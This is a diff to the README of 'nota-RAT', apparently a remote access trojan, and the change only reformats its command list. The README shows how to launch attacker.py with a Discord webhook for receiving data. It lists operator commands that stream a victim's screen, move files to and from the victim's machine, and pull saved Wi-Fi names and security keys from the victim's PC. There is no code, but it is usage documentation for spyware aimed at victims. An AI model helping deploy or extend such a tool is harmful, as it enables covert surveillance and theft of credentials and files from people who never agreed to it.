@@ -67,16 +67,23 @@ you can change the server ip on the client and bot but not on the server, the de
 * * After you have added discord webhooks as a argument then you need to specify your webhooks URL
 * * Example: python attacker.py -p 5000 -d https://discord.com/api/webhooks/your-webhook-url
 
+---------------------------------------------------------------------------------------------------------------------------------------------------------
 
 These commands are for after you have started nota-RAT and adjusted the behaviour
----------------------------------------------------------------------------------------------------------------------------------------------------------
-Command                    Description
 
-* /help                      Print this message.
-* /getlive                   Gets a live feed of victim's screen.
-* /stoplive                  Stop the live feed of victim's screen.
-* /sendfile                  Sends a file from the files directory in the victom's CWD directory.
-* /getfile                   Gets a file from the victim's CWD and puts it into the files directory.
-* /getwifi                   Gets SSIDs and security keys from victim's PC.
-* /clear                     Clear screen.
-* /exit/quit/q               Close session and exit.
+* /help                      
+* * Print this message.
+* /getlive                   
+* * Gets a live feed of victim's screen.
+* /stoplive                  
+* * Stop the live feed of victim's screen.
+* /sendfile                  
+* * Sends a file from the files directory in the victom's CWD directory.
+* /getfile                   
+* * Gets a file from the victim's CWD and puts it into the files directory.
+* /getwifi                   
+* * Gets SSIDs and security keys from victim's PC.
+* /clear                     
+* * Clear screen.
+* /exit/quit/q               
+* * Close session and exit.
